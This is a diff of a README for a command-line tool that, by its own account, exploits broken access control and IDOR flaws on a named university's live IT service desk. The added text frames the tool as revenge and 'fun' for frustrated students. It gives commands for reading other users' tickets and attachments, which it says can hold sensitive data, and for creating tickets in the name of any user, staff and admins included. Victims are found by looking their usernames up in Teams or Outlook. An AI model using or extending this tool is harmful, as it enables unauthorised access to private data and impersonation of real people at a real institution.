@@ -1,29 +1,33 @@
 # Tel-U Service Desk Breacher
 
-If you ever tired of being student, feeling burnout, lack of motivations, or depressed during study, wouldn't it be better if you take a revenge to have some fun, or shall we make PuTI a little bit busy tonight?
+If you ever tired of being student, feeling burnout, lack of motivations, or depressed during study, wouldn't it be better if you take a revenge to have some fun? or shall we make PuTI a little bit busy tonight?
 
 ![](/img/cover.jpeg)
 
+**The Context:**
+There are several active bugs found on [PuTI Service Desk](https://it-servicedesk.telkomuniversity.ac.id/home) service and this tool was developed by exploiting Broken Access Control, Parameter Tampering, and Insecure Direct Object References on that site. If the bug fixed, this repo would be archived.
+
 ## Overview
 
-A tool to satisfy your frustation that can be used for viewing ticket belonging to another users or creating a new ticket pretending as another users. It's not just a ticket, sometimes user add sensitive data or attachments in it, that's why it might satisfy your frustation 😈. Only works on users who have sent a ticket to the PuTI service desk. ***Under development, tested on Linux***.
+A CLI App to satisfy your frustation that can be used for viewing ticket belonging to another users or creating a new ticket pretending as another users. It's not just a ticket, sometimes user could add sensitive data or attachments in it, that's why it might satisfy your frustation 😈. 
 
 **Key Features:**
-- Automated SSO authentication (Chrome/Firefox/Edge)
+- Automated SSO authentication with Chrome via Selenium
 - Session persistence in `config.json`
 - Breach ticket list and its detail from another user
 - Breach attachments from another user's ticket
 - Send reply to hijack another user's ticket which didn't belong to you (*todo*)
-- Create a new ticket by pretending to be created by some user (*todo*)
+- Create a new ticket as another user account
 
-![](/img/overview.png)
+As long as you know the target username, you can use this tool for viewing helpdesk ticket belonging to another user or creating ticket as another user. "User" here don't only mean students, but also lecturers, staff, rector, or admin.
 
-## Requirements
+![](/img/service-desk.png)
 
-### System Requirements
+**System Requirements:**
+
 - Python 3.7+
-- Chrome, Firefox, or Edge browser
-- Linux or Windows (Tested on Linux)
+- Chrome
+- Worked perfectly on Linux
 
 **Required packages:**
 - `click` - CLI framework
@@ -57,16 +61,21 @@ chmod +x cli.py
 
 ## How to Use
 
+The tool needs Auth Bearer Token and target SSO username in order to work perfectly. If one of them missing, you can't use this tool. To get those info:
+
+1. **Auth Bearer token:** execute `./cli.py login` and complete the login sequence using your Microsoft Student account
+2. **Victim username:** You can get this info either from typing the victim name on Ms. Teams or Ms. Outlook.
+
 ### 1. Login (First Time)
 
-Run the login first:
+You must login with your Microsoft SSO Student first to get Auth Token.
 ```bash
 ./cli.py login
 ```
 
 **What happens:**
 1. Browser opens automatically
-2. Navigate to SATU SSO page
+2. Navigate to SATU SSO page and then Login with your Microsoft Account
 3. **You** complete the login:
    - Enter Tel-U email
    - Enter password
@@ -80,15 +89,20 @@ Run the login first:
 ```bash
 ./cli.py login --browser chrome # default
 ./cli.py login --browser firefox
-./cli.py login --browser auto
 ```
 
-### 2. View All Tickets
+### 2. View All Tickets belonging to Other User
 
-The simplest way to use the tool is fetch ALL tickets for a user:
+![](/img/overview.png)
 
 ```bash
 ./cli.py tickets --username {sso_username}
+```
+
+Or if you want more detailed output:
+
+```bash
+./cli.py tickets --username {sso_username} --format detail
 ```
 
 **What it does:**
@@ -96,14 +110,7 @@ The simplest way to use the tool is fetch ALL tickets for a user:
 - Sorts by creation time (newest first)
 - Shows status label for each ticket
 
-**Examples:**
-```bash
-./cli.py tickets --username king.wzrd
-./cli.py tickets --username king.wzrd --format detail
-./cli.py tickets --username king.wzrd --format json
-```
-
-### 3. Filter by Specific Status
+#### 2.1. Filter by Specific Status
 
 If you only want tickets with a specific status:
 
@@ -141,6 +148,46 @@ If you only want tickets with a specific status:
 - `list`: Summary view with ticket IDs, status, and short description (default)
 - `detail`: Full ticket details including tasks, assignees, attachments
 - `json`: Raw JSON response
+
+## 3. Create New Ticket as Another User
+
+The `create-ticket` command allows you to create a new service desk ticket as any specified user.
+
+```bash
+./cli.py create-ticket --username {sso_username} --description "{message}"
+```
+
+- `--username`: Target SSO username. Specify which user the ticket will be created as
+- `--description`: The ticket description/message
+
+Usage Example:
+
+```bash
+./cli.py create-ticket --username victim.user --description "Hi there, im hacker. I use your account to create this ticket."
+```
+
+Or you can use interactive mode:
+
+```bash
+./cli.py create-ticket
+```
+
+You'll be prompted for Target username and Ticket description
+
+### 3.1 Multi-line Description
+
+For longer descriptions, use quotes and newlines:
+
+```bash
+./cli.py create-ticket \
+  --username victim.user \
+  --description "
+Issue: Email access problem
+Details: After resetting password, still cannot login
+Attempted solutions: Cleared browser cache, tried different browsers
+Request: Please reset email account
+"
+```
 
 ## Configuration
 
@@ -233,72 +280,20 @@ Ticket #24340
   admin_puti1, admin_puti2, admin_puti3
 ```
 
-## Troubleshooting
-
-### "Not authenticated"
-Run login first:
-```bash
-./cli.py login
-```
-
-### "Session expired"
-Tokens expire after ~24 hours. Re-authenticate:
-```bash
-./cli.py login
-```
-
-### "Selenium not installed"
-```bash
-pip3 install selenium webdriver-manager
-```
-
-## Usage Patterns
-
-### Quick User Audit
-Get all tickets for a user to see their full history:
-```bash
-./cli.py tickets --username king.wzrd
-```
-
-### Check Active Work
-Filter only in-progress tickets:
-```bash
-./cli.py tickets --username king.wzrd --status in-progress
-```
-
-### Export for Analysis
-Get all tickets in JSON format:
-```bash
-./cli.py tickets --username king.wzrd --format json > king_wzrd_tickets.json
-```
-
-### Detailed Investigation
-View full details of all tickets:
-```bash
-./cli.py tickets --username king.wzrd --format detail
-```
-
 ## Project Structure
 
 ```
-Telyu-CLI/
+Telyu-ServiceDesk-Breacher/
 ├── cli.py                    # CLI entry point
 ├── telyu_cli/                # Source code package
-│   ├── __init__.py
 │   ├── api.py                # Service Desk API wrapper
 │   ├── auth.py               # Authentication & token management
 │   ├── formatter.py          # Output formatting utilities
 │   └── browser_login.py      # Automated browser login
-├── docs/                     # Documentation
-│   └── CHANGELOG.md
 ├── img/                      # Images
-│   ├── cover.jpeg
-│   └── overview.png
 ├── config.json               # Session data (created after login)
 ├── config.json.example       # Example configuration
 ├── requirements.txt          # Python dependencies
 ├── setup.sh                  # Quick setup script
-├── LICENSE
-├── .gitignore
 └── README.md                 # This file
 ```
